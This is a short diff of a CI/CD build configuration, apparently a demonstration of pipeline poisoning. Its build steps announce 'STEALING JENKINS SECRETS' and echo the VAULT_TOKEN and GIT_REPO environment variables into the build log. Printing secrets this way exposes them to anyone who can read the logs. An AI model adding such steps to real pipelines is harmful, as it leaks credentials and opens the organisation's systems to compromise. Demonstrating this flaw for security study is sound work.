@@ -2,8 +2,6 @@
 build_commands:
   - echo "Starting legitimate command execution..."
   - echo "WARNING: CI/CD Vulnerability Demonstration"
-  
-  # Stealing Jenkins secrets
   - echo "STEALING JENKINS SECRETS:"
   - echo "VAULT_TOKEN: $VAULT_TOKEN"
   - echo "GIT_REPO: $GIT_REPO"
